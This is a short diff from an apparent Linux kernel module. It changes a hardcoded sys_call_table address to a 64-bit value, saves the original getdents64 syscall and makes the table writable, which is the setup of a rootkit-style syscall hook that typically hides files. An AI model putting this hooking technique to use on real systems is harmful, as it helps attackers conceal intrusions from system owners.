@@ -61,7 +61,8 @@ int set_page_ro(unsigned long addr) {
 }
 
 int f_init(void) {
-  sys_call_table = (void*)0xc1454100;
+  sys_call_table = (void*)0xffffffff820013a0;
+
   getdents64_original = sys_call_table[__NR_getdents64];
 
   set_page_rw(sys_call_table);
